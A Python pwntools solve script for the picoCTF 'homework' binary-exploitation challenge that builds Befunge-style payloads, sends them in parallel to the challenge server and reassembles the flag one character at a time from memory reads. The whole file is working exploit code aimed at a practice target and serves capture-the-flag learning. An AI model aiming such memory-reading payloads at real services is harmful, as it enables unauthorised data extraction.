#!/usr/bin/env python3
# homework picoCTF Binary Exploitation Challenge
### Author: Kuraiyume ###
from pwn import *
from concurrent.futures import ThreadPoolExecutor

# Data codes to push numbers up to 0x21
data_codes = [
    "0", "0!", "0!:+", "0!::++", "0!:+:+", 
    "0!::+:++", "0!:+::++", "0!::+::+++", "0!:+:+:+", 
    "0!::++:*", "0!::+:++:+", "0!:::+:++:++", 
    "0!:+::++:+", "0!::+::++:++", "0!::+::+++:+", 
    "0!::+:++::++", "0!:+:*:*", "0!::+:*:*+", 
    "0!::++:*:+", "0!:::++:*:++", "0!::+:++:+:+", 
    "0!:::+:++:+:++"
]

def assemble_payload(col_index, row_index):
    """
    This function is responsible for constructing the payload that will be sent to the target service.
    It combines different elements (initial hardcoded payload, formatted row/column data) to form
    a complete payload string.

    Parameters:
    - col_index (int): Column index to select a specific code from the data_codes array.
    - row_index (int): Row index to select another code from the data_codes array.

    Returns:
    - payload (bytes): The assembled payload as a sequence of bytes ready to be sent.
    """
    
    # Initial base part of the payload.
    initial_payload = b"0!::+::+++:*0!+:00!-v\n"
    
    # Format the data from the row based on row_index, with left-aligned padding.
    # The resulting formatted string is converted to bytes and appended to the payload.
    formatted_code = f"\\0\\p{data_codes[row_index]:A<14}+v>\n".encode()
    
    # Similarly, format the data from the column, converting it into bytes.
    target_data = f"{data_codes[col_index]:A<14}\\g,@A>A\n".encode()

    # Combine the initial payload, row, and column data to form the complete payload.
    return initial_payload + formatted_code + target_data + b"\n"

def transmit_request(col_index, row_index):
    """
    This function handles the interaction with the remote target service. It establishes a connection,
    sends the constructed payload, and retrieves the server's response.

    Parameters:
    - col_index (int): The index for selecting the column data from the data_codes array.
    - row_index (int): The index for selecting the row data from the data_codes array.

    Returns:
    - last_character (str): The last character of the response from the server.
    """
    
    # Establishing a connection to the remote target.
    connection = remote("mars.picoctf.net", 31689)
    
    # Receive and discard the initial prompt/banner from the server.
    connection.recvline()

    # Construct the payload using the column and row indices.
    payload = assemble_payload(col_index, row_index)
    
    # Print the payload.
    print(payload.decode())

    # Send the crafted payload to the server.
    connection.send(payload)
    
    # Receive and return the last character from the server's response.
    # It is assumed that the meaningful information (flag) is in the final character.
    return connection.recvall().decode()[-1]

def execute_requests():
    """
    This function coordinates the parallel execution of multiple requests to the target service.
    By using ThreadPoolExecutor, it manages a pool of worker threads, each of which sends
    a request with different payload variations (based on column and row indices).

    It then collects the responses, accumulates the result, and prints the final output.

    The function submits several tasks to be executed concurrently:
    - Requests for columns in the range of 8 to 0x16, with a fixed row index.
    - Requests for all columns (range 0 to 0x16) for other row indices (2, 3, and 4).
    """
    
    # Variable to accumulate the results/flag from the responses.
    output = ""
    
    # ThreadPoolExecutor allows us to run multiple requests in parallel with 10 threads.
    with ThreadPoolExecutor(max_workers=10) as executor:
        # List to store Future objects representing the result of each submitted task.
        task_futures = []
        
        # First batch of tasks: Column indices from 8 to 0x16 (22 in decimal), with row index 2.
        for col_index in range(8, 0x16):
            task_futures.append(executor.submit(transmit_request, col_index, 2))
        
        # Second batch of tasks: Column indices from 0 to 0x16, with row index 3.
        for col_index in range(0x16):
            task_futures.append(executor.submit(transmit_request, col_index, 3))
        
        # Third batch of tasks: Column indices from 0 to 0x16, with row index 4.
        for col_index in range(0x16):
            task_futures.append(executor.submit(transmit_request, col_index, 4))

        # Collect and accumulate the results from each completed task.
        for future in task_futures:
            output += future.result()

    # Once all tasks are done, print the final result (the flag).
    print("[+] Flag Successfully retrieved! Here it is master:")
    print(output)

if __name__ == "__main__":
    execute_requests() # Call the main function.

